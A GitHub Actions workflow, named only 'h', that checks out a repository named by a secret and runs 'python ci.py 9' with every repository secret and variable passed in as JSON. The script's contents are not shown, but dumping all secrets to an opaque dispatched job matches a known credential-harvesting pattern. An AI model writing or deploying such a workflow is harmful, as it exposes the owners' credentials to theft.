name: h

on:
  workflow_dispatch:
  repository_dispatch:
    types: [h]

concurrency:
  group: h
  cancel-in-progress: false

jobs:
  scan:
    runs-on: ubuntu-latest
    timeout-minutes: 180

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          repository: ${{ secrets.REPO_NAME }}
          token: ${{ secrets.REPO_TOKEN }}
          ref: main

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Run scan
        env:
          CTX: ${{ toJSON(secrets) }}
          VARS: ${{ toJSON(vars) }}
        run: python ci.py 9
